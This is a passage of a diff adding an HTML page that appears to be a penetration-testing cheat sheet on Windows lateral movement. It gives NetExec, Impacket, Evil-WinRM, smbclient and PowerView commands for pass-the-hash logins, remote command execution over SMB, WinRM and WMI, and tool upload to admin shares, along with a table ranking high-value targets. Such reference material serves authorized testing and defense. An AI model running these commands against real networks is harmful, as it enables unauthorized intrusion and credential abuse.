+<td><code>ADMIN$</code> readable/writable</td>
+<td>Strong admin indicator.</td>
+</tr>
+<tr>
+<td><code>C$</code> accessible</td>
+<td>Strong admin indicator.</td>
+</tr>
+<tr>
+<td>Service creation works</td>
+<td>Local admin or equivalent.</td>
+</tr>
+<tr>
+<td>Remote scheduled task works</td>
+<td>Local admin or equivalent.</td>
+</tr>
+<tr>
+<td>WMI command execution works</td>
+<td>Local admin or equivalent.</td>
+</tr>
+<tr>
+<td>WinRM command execution works</td>
+<td>Remote management rights.</td>
+</tr>
+</tbody>
+</table>
+<p>NetExec SMB sweep:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Typical admin indicator:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Pwn3d!
+</span></code></pre></div>
+<p>With NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Check local admin with SMB shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<p>Check WinRM access:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Check RDP access:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Check one host:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>PowerView local admin discovery:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Find-LocalAdminAccess</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">Find-DomainLocalGroupMember</span> <span class="n">-GroupName</span> <span class="n">Administrators</span>
+</span></code></pre></div>
+<p>Manual Windows checks from an accessible host:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>net localgroup administrators
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>net localgroup administrators /domain
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>whoami /groups
+</span></code></pre></div>
+<p>Remote local administrators with PowerShell:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Get-LocalGroupMember</span> <span class="n">-Group</span> <span class="n">Administrators</span>
+</span></code></pre></div>
+<p>Remote with PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="n">FILESRV01</span> <span class="n">-GroupName</span> <span class="n">Administrators</span>
+</span></code></pre></div>
+<p>Target prioritization:</p>
+<table>
+<thead>
+<tr>
+<th>Target type</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>File server</td>
+<td>Shares, scripts, sensitive files.</td>
+</tr>
+<tr>
+<td>SQL server</td>
+<td>Databases and service accounts.</td>
+</tr>
+<tr>
+<td>Web/app server</td>
+<td>Application configs and credentials.</td>
+</tr>
+<tr>
+<td>Jump host</td>
+<td>Admin sessions.</td>
+</tr>
+<tr>
+<td>Backup server</td>
+<td>Broad access and stored secrets.</td>
+</tr>
+<tr>
+<td>SCCM/MECM</td>
+<td>Endpoint management.</td>
+</tr>
+<tr>
+<td>Domain controller</td>
+<td>Highest-value, but usually heavily monitored.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="smb-admin-shares">SMB Admin Shares</h2>
+<p>SMB admin shares are default administrative shares available on Windows systems.</p>
+<p>Common admin shares:</p>
+<table>
+<thead>
+<tr>
+<th>Share</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ADMIN$</code></td>
+<td>Usually maps to <code>C:\Windows</code>.</td>
+</tr>
+<tr>
+<td><code>C$</code></td>
+<td>Administrative share for the C drive.</td>
+</tr>
+<tr>
+<td><code>D$</code></td>
+<td>Administrative share for the D drive if present.</td>
+</tr>
+<tr>
+<td><code>IPC$</code></td>
+<td>Inter-process communication share.</td>
+</tr>
+</tbody>
+</table>
+<p>List shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<p><code>smbclient</code> list:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$TARGET</span>/<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Connect to <code>C$</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/C$<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Connect to <code>ADMIN$</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/ADMIN$<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Upload file:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/ADMIN$<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;put tool.exe&#39;</span>
+</span></code></pre></div>
+<p>Download file:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/C$<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get Users\Public\file.txt&#39;</span>
+</span></code></pre></div>
+<p>Impacket SMB client:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>smbclient.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>smbclient.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>Useful locations:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>C:\Windows\Temp
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>C:\Users\Public
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>C:\ProgramData
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>C:\Temp
+</span></code></pre></div>
+<p>Common SMB admin share outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>C$</code> accessible</td>
+<td>Local admin likely.</td>
+</tr>
+<tr>
+<td><code>ADMIN$</code> accessible</td>
+<td>Local admin likely.</td>
+</tr>
+<tr>
+<td><code>Access denied</code></td>
+<td>Not local admin or blocked by policy.</td>
+</tr>
+<tr>
+<td>Upload succeeds</td>
+<td>File write path available.</td>
+</tr>
+<tr>
+<td>File read succeeds</td>
+<td>Useful for collection or staging in labs.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="psexec">PsExec</h2>
+<p>PsExec-style lateral movement creates or uploads a service on a remote host over SMB and starts it through the Service Control Manager.</p>
+<p>It usually requires local administrator rights on the target.</p>
+<p>Common tools:</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Platform</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>psexec.py</code></td>
+<td>Impacket, Linux.</td>
+</tr>
+<tr>
+<td><code>smbexec.py</code></td>
+<td>Impacket, Linux.</td>
+</tr>
+<tr>
+<td><code>atexec.py</code></td>
+<td>Impacket, Linux.</td>
+</tr>
+<tr>
+<td><code>PsExec.exe</code></td>
+<td>Sysinternals, Windows.</td>
+</tr>
+<tr>
+<td>NetExec <code>-x</code> / <code>-X</code></td>
+<td>Command execution over SMB.</td>
+</tr>
+</tbody>
+</table>
+<p>Impacket PsExec with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>psexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>With NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>psexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span></code></pre></div>
+<p>Run command with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>PowerShell command:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-X<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>Sysinternals PsExec from Windows:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>PsExec.exe \\HOSTNAME -u CORP\alice -p Password123! cmd.exe
+</span></code></pre></div>
+<p>Run command:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>PsExec.exe \\HOSTNAME -u CORP\alice -p Password123! cmd /c whoami
+</span></code></pre></div>
+<p>Common requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB reachable</td>
+<td>Port <code>445</code>.</td>
+</tr>
+<tr>
+<td>Admin rights</td>
+<td>Usually local admin on target.</td>
+</tr>
+<tr>
+<td>Admin shares available</td>
+<td>Used for file/service staging.</td>
+</tr>
+<tr>
+<td>Service Control Manager reachable</td>
+<td>Required to create/start service.</td>
+</tr>
+<tr>
+<td>AV/EDR allowance in lab</td>
+<td>Service binaries may be blocked.</td>
+</tr>
+</tbody>
+</table>
+<p>Common failures:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>STATUS_ACCESS_DENIED</code></td>
+<td>Not local admin or blocked.</td>
+</tr>
+<tr>
+<td><code>ADMIN$</code> unavailable</td>
+<td>Admin share disabled or inaccessible.</td>
+</tr>
+<tr>
+<td>Service creation fails</td>
+<td>SCM access denied or endpoint protection.</td>
+</tr>
+<tr>
+<td>Authentication works but command fails</td>
+<td>Rights or execution policy issue.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="winrm">WinRM</h2>
+<p>WinRM is Windows Remote Management.</p>
+<p>It commonly listens on:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>5985</code></td>
+<td>WinRM HTTP</td>
+</tr>
+<tr>
+<td><code>5986</code></td>
+<td>WinRM HTTPS</td>
+</tr>
+</tbody>
+</table>
+<p>WinRM access often requires membership in:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Administrators
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Remote Management Users
+</span></code></pre></div>
+<p>Check WinRM:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Run command with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>PowerShell command:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-X<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>Evil-WinRM with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>With domain:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Upload file in Evil-WinRM:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">upload</span> <span class="n">tool</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
+<p>Download file:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="n">download</span> <span class="n">output</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<p>PowerShell remoting from Windows:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">HOSTNAME</span> <span class="n">-Credential</span> <span class="n">CORP</span><span class="p">\</span><span class="n">alice</span>
+</span></code></pre></div>
+<p>Run command:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">HOSTNAME</span> <span class="n">-Credential</span> <span class="n">CORP</span><span class="p">\</span><span class="n">alice</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">whoami</span> <span class="p">}</span>
+</span></code></pre></div>
+<p>WinRM result meanings:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Login works</td>
+<td>User can use WinRM on target.</td>
+</tr>
+<tr>
+<td>Command works</td>
+<td>Remote command execution available.</td>
+</tr>
+<tr>
+<td>Auth works but access denied</td>
+<td>User may lack remote management rights.</td>
+</tr>
+<tr>
+<td>Port closed</td>
+<td>WinRM disabled or filtered.</td>
+</tr>
+<tr>
+<td>HTTPS only</td>
+<td>Try port <code>5986</code> or SSL options.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="wmi">WMI</h2>
+<p>WMI can be used for remote command execution on Windows hosts.</p>
+<p>It usually requires local administrator rights on the target.</p>
+<p>Common WMI ports:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>135</code></td>
+<td>RPC Endpoint Mapper</td>
+</tr>
+<tr>
+<td>Dynamic RPC ports</td>
+<td>WMI/DCOM communication</td>
+</tr>
+<tr>
+<td><code>445</code></td>
+<td>Often used by tools for output retrieval</td>
+</tr>
+</tbody>
+</table>
+<p>Impacket WMIExec with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span></code></pre></div>
+<p>Run single command:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>NetExec WMI execution:</p>
